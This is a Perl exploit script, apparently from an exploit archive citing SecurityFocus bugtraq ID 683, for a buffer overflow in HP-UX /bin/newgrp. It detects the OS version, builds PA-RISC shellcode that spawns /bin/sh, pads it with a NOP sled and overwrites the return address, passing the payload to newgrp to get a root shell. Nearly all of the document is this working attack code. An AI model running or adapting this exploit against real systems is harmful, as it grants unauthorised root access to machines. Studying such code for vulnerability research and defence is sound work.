#source: https://www.securityfocus.com/bid/683/info
#
#Due to insufficient bounds checking on user supplied arguments, it is possible to overflow an internal buffer and execute arbitrary code as root.

#!/usr/bin/perl

use FileHandle;

sub h2cs {
local($stuff)=@_;
local($rv);
while($stuff !~ /^$/) {
$bob=$stuff;
$bob =~ s/^(..).*$/$1/;
$stuff =~ s/^..//;
$rv.=chr(oct("0x${bob}"));
}
return $rv;
}

open(PIPE,"uname -r|");
chop($rev=<PIPE>);
close(PIPE);
$rev =~ s/^.*\.(.*)\..*$/$1/;

if ($rev eq "10") {
$offset=2074;
$prealign="";
$postalign="P";
$pcoq=h2cs("7b03A00C");
} else {
$offset=2074;
$prealign="";
$postalign="P";
$pcoq=h2cs("7b03300C");
}

$nop=h2cs("08210280");
$code="";
# Oddly enough, real uid already == 0
# Could probably make a + + link bug out of this, too..
#$code.=h2cs("34160506"); # LDI 643,r22
#$code.=h2cs("96d60534"); # SUBI 666,r22,r22
#$code.=h2cs("20200801"); # LDIL L%0xc0000004,r1
#$code.=h2cs("e420e008"); # BLE 4(sr7,r1)
#$code.=h2cs("0b5a029a"); # XOR arg0,arg0,arg0
$code.=h2cs("e83f1ffd"); # BL .+8,r1
$code.=h2cs("08210280"); # NOP
$code.=h2cs("34020102"); # LDI 129,rp
$code.=h2cs("08410402"); # SUB r1,rp,rp
$code.=h2cs("60400162"); # STB r0,177(rp)
$code.=h2cs("b45a0154"); # ADDI 170,rp,arg0
$code.=h2cs("0b390299"); # XOR arg0,arg0,arg0
$code.=h2cs("0b180298"); # XOR arg0,arg0,arg0
$code.=h2cs("341604be"); # LDI 607,r22
$code.=h2cs("20200801"); # LDIL L%0xc0000004,r1
$code.=h2cs("e420e008"); # BLE 4(sr7,r1)
$code.=h2cs("96d60534"); # SUB 666,r22,r22
$code.=h2cs("deadcafe"); # Illegal instruction -- dump core if exec fails
$data="/bin/sh."; # Data stuff

$codedata=$code.$data;
$num=int(($offset-length($code)-length($data)-4)/4);
$pre="$nop"x$num;
$of=$prealign;
$of.=$pre.$code.$data.$postalign.$pcoq;
exec("/bin/newgrp","$of");